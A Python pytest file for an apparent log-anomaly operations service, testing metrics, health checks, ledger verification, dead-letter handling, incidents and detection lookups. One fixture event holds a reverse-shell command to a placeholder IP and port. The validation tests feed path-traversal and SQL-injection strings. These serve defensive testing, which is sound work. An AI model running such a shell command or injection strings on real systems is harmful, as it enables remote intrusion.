"""Operational services: aggregation, missing data, failures, bounds."""

from __future__ import annotations

import datetime as dt

import pytest

from signalops.models import Severity, Status, ValueState
from signalops.services import OpsServices
from signalops.services import detections as det_sql
from signalops.services import ledger as ledger_sql
from signalops.services import metrics as m
from signalops.services.common import TTLCache, kafka_records_since
from signalops.services.detections import NotFoundError, validate_host_name
from signalops.services.dlq import parse_dlq_value, sanitize_payload
from signalops.services.health import overall_status
from signalops.services.incidents import validate_incident_id
from signalops.services.metrics import bucket_minutes_for
from signalops.sources.errors import DataSourceError
from tests.signalops.conftest import inject_dlq_burst, make_settings
from tests.signalops.fakes import FakeDatabase, FakeKafka, ago

# --------------------------------------------------------------------------- #
# Metrics                                                                      #
# --------------------------------------------------------------------------- #


def test_metrics_aggregate_real_values(services: OpsServices) -> None:
    metrics = services.metrics.collect(60)
    assert metrics.metric("kafka.logs.raw.records_in_window").value == 1500
    assert metrics.metric("postgres.raw_events.landed_in_window").value == 1500
    assert metrics.metric("spark.raw_rows_processed").value == 1500
    assert metrics.metric("spark.dlq_rows_written").value == 0
    assert metrics.metric("spark.dlq_rows_written").state is ValueState.ok  # a real zero
    assert metrics.metric("latency.landing.p95").value == pytest.approx(11.8)
    assert all(m.source for m in metrics.metrics)


def test_kafka_window_count_uses_offsets_not_consumption(kafka: FakeKafka) -> None:
    since = dt.datetime.now(tz=dt.timezone.utc) - dt.timedelta(minutes=60)
    assert kafka_records_since(kafka, "logs.raw", since) == 1500
    # -1 from offsets_for_times means nothing newer than `since` in that partition.
    kafka.since["logs.raw"] = {0: -1, 1: 9_999}
    assert kafka_records_since(kafka, "logs.raw", since) == 1
    assert kafka.tail_calls == []


def test_empty_kafka_topic_is_zero_not_unknown(services: OpsServices, kafka: FakeKafka) -> None:
    kafka.marks["logs.raw"] = {0: (0, 0), 1: (0, 0)}
    kafka.since["logs.raw"] = {0: -1, 1: -1}
    metric = services.metrics.collect(60).metric("kafka.logs.raw.records_in_window")
    assert metric.state is ValueState.ok and metric.value == 0


def test_kafka_outage_is_unavailable_not_zero(services: OpsServices, kafka: FakeKafka) -> None:
    kafka.down = True
    metric = services.metrics.collect(60).metric("kafka.logs.raw.records_in_window")
    assert metric.state is ValueState.unavailable
    assert metric.value is None


def test_database_outage_marks_every_db_metric_unavailable(services: OpsServices, db: FakeDatabase) -> None:
    db.down = DataSourceError("postgres", "cannot connect", unavailable=True)
    metrics = services.metrics.collect(60)
    db_metrics = [x for x in metrics.metrics if not x.name.startswith("kafka.")]
    assert db_metrics and all(x.state is ValueState.unavailable and x.value is None for x in db_metrics)
    assert all(s.state is ValueState.unavailable and not s.points for s in metrics.series)
    assert any("Spark query state unavailable" in n for n in metrics.notes)


def test_query_failure_is_error_state(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.LANDING_LATENCY_SQL, DataSourceError("postgres", "statement timeout", unavailable=False))
    metric = services.metrics.collect(60).metric("latency.landing.p50")
    assert metric.state is ValueState.error and "timeout" in metric.detail


def test_missing_spark_telemetry_is_unknown(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.STREAM_WINDOW_SQL, [])
    db.on(m.STREAM_LATEST_SQL, [])
    metrics = services.metrics.collect(60)
    assert metrics.metric("spark.raw_rows_processed").state is ValueState.unknown
    assert metrics.metric("spark.max_offsets_behind_latest").state is ValueState.unknown


def test_sink_without_output_rows_is_unknown(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.STREAM_WINDOW_SQL, [{"query_name": "dead-letters", "batches": 3, "input_rows": 10,
                                 "output_rows": None, "batches_reporting_output": 0,
                                 "last_batch": ago(seconds=5)}])
    assert services.metrics.collect(60).metric("spark.dlq_rows_written").state is ValueState.unknown


def test_latency_without_rows_is_unknown(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.LANDING_LATENCY_SQL, {"n": 0, "p50": None, "p95": None})
    assert services.metrics.collect(60).metric("latency.landing.p50").state is ValueState.unknown


def test_series_are_zero_filled_only_when_query_succeeded(services: OpsServices) -> None:
    series = {s.name: s for s in services.metrics.collect(60).series}
    landed = series["postgres.landed"]
    assert landed.state is ValueState.ok
    assert len(landed.points) >= 60 and sum(p.value for p in landed.points) == 750


@pytest.mark.parametrize("window", [0, -5, 7 * 24 * 60 + 1])
def test_window_bounds_enforced(services: OpsServices, window: int) -> None:
    with pytest.raises(ValueError):
        services.metrics.collect(window)


def test_bucket_size_bounds_point_count() -> None:
    for window in (15, 60, 240, 1440, 10080):
        assert window / bucket_minutes_for(window) <= 120


def test_stale_stream_query_flagged(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.STREAM_QUERIES_SQL, [{"query_name": "normalized-events", "status": "active",
                                  "last_event_at": ago(minutes=10), "last_progress_at": None,
                                  "last_batch_id": 1, "exception": None}])
    states = {q.query_name: q for q in services.metrics.stream_queries()}
    assert states["normalized-events"].stale is True
    assert states["dead-letters"].status == "missing"


# --------------------------------------------------------------------------- #
# Health                                                                       #
# --------------------------------------------------------------------------- #


def test_healthy_pipeline(services: OpsServices) -> None:
    health = services.health.check()
    assert health.status is Status.healthy, health.summary
    assert {c.name for c in health.components} == {"postgres", "kafka", "spark", "detector", "ledger"}


def test_terminated_query_makes_spark_unhealthy(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.STREAM_QUERIES_SQL, [{"query_name": "evidence-store", "status": "terminated",
                                  "last_event_at": ago(seconds=5), "last_progress_at": None,
                                  "last_batch_id": 3, "exception": "org.postgresql.util.PSQLException: refused"}])
    health = services.health.check()
    spark = next(c for c in health.components if c.name == "spark")
    assert spark.status is Status.unhealthy and "PSQLException" in spark.detail
    assert health.status is Status.unhealthy


def test_no_stream_telemetry_is_unknown(services: OpsServices, db: FakeDatabase) -> None:
    db.on(m.STREAM_QUERIES_SQL, [])
    spark = services.health.spark()
    assert spark.status is Status.unknown


def test_missing_topics_degrade_kafka(services: OpsServices, kafka: FakeKafka) -> None:
    del kafka.topic_partitions["alerts.anomalies"]
    component = services.health.kafka()
    assert component.status is Status.degraded and "alerts.anomalies" in component.detail


def test_detector_not_deployed_is_unknown(services: OpsServices, db: FakeDatabase) -> None:
    from signalops.services import health as health_sql

    db.on(health_sql.DETECTOR_SQL, {"runs": 0, "last_scored": None})
    assert services.health.detector().status is Status.unknown


def test_everything_down_is_unavailable_and_fast(services: OpsServices, db: FakeDatabase,
                                                 kafka: FakeKafka) -> None:
    db.down = DataSourceError("postgres", "cannot connect", unavailable=True)
    kafka.down = True
    health = services.health.check()
    assert health.status is Status.unavailable
    statuses = {c.name: c.status for c in health.components}
    assert statuses["postgres"] is Status.unavailable
    assert statuses["spark"] is Status.unknown  # cannot judge, not "healthy"


def test_overall_ignores_unknown_unless_all_unknown() -> None:
    from signalops.models import ComponentHealth

    def c(status: Status) -> ComponentHealth:
        return ComponentHealth(name="x", status=status, checked_at=dt.datetime.now(tz=dt.timezone.utc),
                               detail="")

    assert overall_status([c(Status.healthy), c(Status.unknown)]) is Status.healthy
    assert overall_status([c(Status.unknown)]) is Status.unknown
    assert overall_status([c(Status.degraded), c(Status.unavailable)]) is Status.unavailable


# --------------------------------------------------------------------------- #
# Ledger                                                                       #
# --------------------------------------------------------------------------- #


def test_ledger_intact(services: OpsServices) -> None:
    status = services.ledger.status()
    assert status.status is Status.healthy
    assert status.unsealed_events == 40 and status.last_verification.intact


def test_ledger_verification_failure_is_unhealthy(services: OpsServices, db: FakeDatabase) -> None:
    failed = {"verification_id": 4, "started_at": ago(minutes=1), "finished_at": ago(seconds=30),
              "intact": False, "events_checked": 10, "blocks_checked": 2, "unsealed_events": 0,
              "finding_count": 1, "findings": [{"kind": "event_modified", "detail": "digest differs",
                                                "event_id": "e1", "sequence_number": None}]}
    db.on(ledger_sql.VERIFICATIONS_SQL, failed)
    db.on(ledger_sql.RECENT_FAILURES_SQL, [failed])
    status = services.ledger.status()
    assert status.status is Status.unhealthy
    assert status.last_verification.findings[0].kind == "event_modified"


def test_ledger_never_verified_is_unknown(services: OpsServices, db: FakeDatabase) -> None:
    db.on(ledger_sql.VERIFICATIONS_SQL, None)
    assert services.ledger.status().status is Status.unknown


def test_ledger_stalled_sealing_degrades(services: OpsServices, db: FakeDatabase) -> None:
    db.on(ledger_sql.CHAIN_STATUS_SQL, {"blocks": 1, "digested_events": 900, "unsealed_events": 800,
                                        "head_sequence": 0, "head_hash": "00", "last_sealed_at": ago(hours=2)})
    status = services.ledger.status()
    assert status.status is Status.degraded and "800 events unsealed" in status.detail


def test_ledger_missing_ops_table_reports_unknown(services: OpsServices, db: FakeDatabase) -> None:
    db.on(ledger_sql.VERIFICATIONS_SQL, DataSourceError("postgres", "relation missing", unavailable=False))
    status = services.ledger.status()
    assert status.status is Status.unknown and "unreadable" in status.detail


# --------------------------------------------------------------------------- #
# DLQ                                                                          #
# --------------------------------------------------------------------------- #


def test_dlq_burst_counts_and_reasons(services: OpsServices, kafka: FakeKafka) -> None:
    inject_dlq_burst(kafka, count=300)
    summary = services.dlq.summary(60, 50)
    assert summary.records_in_window.value == 300
    assert summary.dlq_ratio.value == pytest.approx(300 / 1500)
    assert set(summary.sample_error_counts) == {"unknown_category", "severity_out_of_range"}
    assert summary.sample_covers_window is False and summary.notes  # 50 of 300 sampled


def test_dlq_payload_previews_never_contain_labels(services: OpsServices, kafka: FakeKafka) -> None:
    inject_dlq_burst(kafka, count=10)
    for sample in services.dlq.summary(60, 50).samples:
        assert "ground_truth" not in (sample.payload_preview or "")
        assert "reverse_shell" not in (sample.payload_preview or "")


@pytest.mark.parametrize("payload", [
    '{"a":1,"labels":{"ground_truth":{"is_anomaly":true}}}',
    '{"a":1,"labels":{"ground_truth":{"is_anomaly":true}}',  # malformed JSON
    'garbage "ground_truth": {"scenario": "c2_beacon"} more',
])
def test_sanitize_payload_strips_ground_truth(payload: str) -> None:
    cleaned = sanitize_payload(payload)
    assert "ground_truth" not in cleaned and "c2_beacon" not in cleaned and "is_anomaly" not in cleaned


def test_parse_dlq_value_tolerates_garbage() -> None:
    assert parse_dlq_value(b"\xff\xfe not json")["error"] == "unparseable_dlq_record"
    assert parse_dlq_value(None) == {}


def test_dlq_ratio_unknown_without_raw_input(services: OpsServices, kafka: FakeKafka) -> None:
    kafka.since["logs.raw"] = {0: -1, 1: -1}
    assert services.dlq.summary(60).dlq_ratio.state is ValueState.unknown


def test_dlq_without_kafka_is_unavailable(db: FakeDatabase) -> None:
    services = OpsServices.build(make_settings(), db=db, kafka=None)
    summary = services.dlq.summary(60)
    assert summary.records_in_window.state is ValueState.unavailable
    assert summary.dlq_ratio.state is ValueState.unavailable


# --------------------------------------------------------------------------- #
# Incidents                                                                    #
# --------------------------------------------------------------------------- #


def test_no_candidates_when_healthy(services: OpsServices) -> None:
    result = services.incidents.candidates(60)
    assert result.candidates == [] and result.rules_skipped == []


def test_dlq_spike_candidate_with_policy_severity(services: OpsServices, kafka: FakeKafka) -> None:
    inject_dlq_burst(kafka, count=300)  # 20% of raw input
    [candidate] = services.incidents.candidates(60).candidates
    assert candidate.incident_id == "dlq_spike:logs.raw.dlq"
    assert candidate.severity is Severity.medium  # 20% < 25% high threshold
    assert candidate.status == "candidate"
    assert any(f.name == "dlq.sample.reason.unknown_category" for f in candidate.facts)
    inject_dlq_burst(kafka, count=600)  # 40%
    assert services.incidents.candidates(60).candidates[0].severity is Severity.high


def test_small_dlq_volume_below_minimum_is_not_a_candidate(services: OpsServices, kafka: FakeKafka) -> None:
    inject_dlq_burst(kafka, count=5)
    assert services.incidents.candidates(60).candidates == []


def test_unreadable_inputs_are_reported_as_skipped(services: OpsServices, kafka: FakeKafka) -> None:
    kafka.down = True
    result = services.incidents.candidates(60)
    assert any(s.startswith("dlq_spike") for s in result.rules_skipped)


def test_anomaly_cluster_and_ordering(services: OpsServices, db: FakeDatabase) -> None:
    from signalops.services import incidents as inc_sql

    db.on(inc_sql.ANOMALY_CLUSTER_SQL, [
        {"host_name": "web-01", "windows": 6, "max_score": 2.4, "first_window": ago(minutes=30),
         "last_window": ago(minutes=1)},
        {"host_name": "db-02", "windows": 1, "max_score": 1.1, "first_window": ago(minutes=5),
         "last_window": ago(minutes=4)}])
    db.on(m.STREAM_QUERIES_SQL, [{"query_name": "evidence-store", "status": "terminated",
                                  "last_event_at": ago(seconds=5), "last_progress_at": None,
                                  "last_batch_id": 1, "exception": "boom"}])
    ids = [c.incident_id for c in services.incidents.candidates(60).candidates]
    assert ids[0] == "stream_query_failed:evidence-store"  # critical first
    assert ids.index("anomaly_cluster:web-01") < ids.index("anomaly_cluster:db-02")


@pytest.mark.parametrize("bad", ["", "dlq_spike", "DLQ:x", "dlq_spike:../etc", "x" * 400, "a:b c"])
def test_invalid_incident_ids_rejected(bad: str) -> None:
    with pytest.raises(ValueError):
        validate_incident_id(bad)


# --------------------------------------------------------------------------- #
# Detections and timelines                                                     #
# --------------------------------------------------------------------------- #


def _detection_row(i: int = 7) -> dict[str, object]:
    return {"detection_id": i, "host_name": "web-01", "window_start": ago(minutes=10),
            "window_end": ago(minutes=9), "scored_at": ago(minutes=8), "score": 1.7, "flagged": True,
            "signals": {"mean_nll": 4.2, "max_nll": 9.1}, "model_version": "logbert-0.1.0",
            "event_count": 2}


def test_detection_detail_reports_missing_events(services: OpsServices, db: FakeDatabase) -> None:
    db.on(det_sql.DETAIL_SQL, {**_detection_row(), "thresholds": {"mean_nll": 2.5},
                               "event_ids": ["11111111-1111-1111-1111-111111111111",
                                             "22222222-2222-2222-2222-222222222222"]})
    db.on(det_sql.EVENTS_BY_ID_SQL, [{
        "event_id": "11111111-1111-1111-1111-111111111111", "occurred_at": ago(minutes=10),
        "category": "process", "action": "exec", "outcome": "success", "severity": 5,
        "message": "bash -i >& /dev/tcp/1.2.3.4/4444", "user_name": "www", "process_name": "bash",
        "command_line": "bash -i", "source_ip": None, "destination_ip": "1.2.3.4",
        "destination_port": 4444}])
    detail = services.detections.detail(7)
    assert detail.events_found == 1 and detail.events_requested == 2
    assert "awaiting normalisation" in detail.note


def test_unknown_detection_raises_not_found(services: OpsServices, db: FakeDatabase) -> None:
    db.on(det_sql.DETAIL_SQL, None)
    with pytest.raises(NotFoundError):
        services.detections.detail(999)


@pytest.mark.parametrize("limit", [0, 501])
def test_detection_limits_bounded(services: OpsServices, limit: int) -> None:
    with pytest.raises(ValueError):
        services.detections.list(limit=limit)


def test_detection_list_passes_parameters(services: OpsServices, db: FakeDatabase) -> None:
    db.on(det_sql.LIST_SQL, [_detection_row()])
    db.on(det_sql.COUNT_SQL, {"n": 1})
    page = services.detections.list(host_name="web-01", limit=10)
    assert page.total == 1 and page.items[0].signals["max_nll"] == 9.1
    [params] = db.params_for(det_sql.LIST_SQL)
    assert params["host"] == "web-01" and params["limit"] == 10


@pytest.mark.parametrize("host", ["", "../../etc/passwd", "a b", "x;DROP TABLE", "-lead", "h" * 300])
def test_invalid_host_names_rejected(host: str) -> None:
    with pytest.raises(ValueError):
        validate_host_name(host)


def test_host_timeline_truncates_and_bounds(services: OpsServices, db: FakeDatabase) -> None:
    db.on(det_sql.HOST_SQL, {"host_id": 3})
    event = {"event_id": "e", "occurred_at": ago(minutes=1), "category": "network"}
    db.on(det_sql.HOST_EVENTS_SQL, lambda params: [event] * params["limit"])
    db.on(det_sql.HOST_DETECTIONS_SQL, [])
    timeline = services.detections.host_timeline("web-01", limit=5)
    assert len(timeline.events) == 5 and timeline.events_truncated
    timeline = services.detections.host_timeline("web-01", limit=10_000)
    assert len(timeline.events) == 500  # hard cap


def test_unknown_host_raises_not_found(services: OpsServices, db: FakeDatabase) -> None:
    db.on(det_sql.HOST_SQL, None)
    db.on(det_sql.HOST_DETECTIONS_SQL, [])
    db.on(det_sql.HOST_DETECTION_EXISTS_SQL, None)
    with pytest.raises(NotFoundError):
        services.detections.host_timeline("ghost-99")


def test_no_operational_query_reads_ground_truth() -> None:
    import inspect

    import signalops.services.detections
    import signalops.services.dlq
    import signalops.services.health
    import signalops.services.incidents
    import signalops.services.ledger
    import signalops.services.metrics

    for module in (signalops.services.detections, signalops.services.dlq, signalops.services.health,
                   signalops.services.incidents, signalops.services.ledger, signalops.services.metrics):
        source = inspect.getsource(module)
        sql = " ".join(v for k, v in vars(module).items() if k.endswith("_SQL") and isinstance(v, str))
        for forbidden in ("event_labels", "detection_truth", "eval_is_anomaly", "eval_scenario"):
            assert forbidden not in sql, f"{module.__name__} SQL touches {forbidden}"
        assert "INSERT" not in sql.upper() and "DELETE" not in sql.upper() and "UPDATE " not in sql.upper()
        assert source  # module loaded


def test_ttl_cache_reuses_within_ttl() -> None:
    cache = TTLCache(60)
    calls = []
    assert cache.get_or_compute("k", lambda: calls.append(1) or 1) == 1
    assert cache.get_or_compute("k", lambda: calls.append(1) or 2) == 1
    assert len(calls) == 1
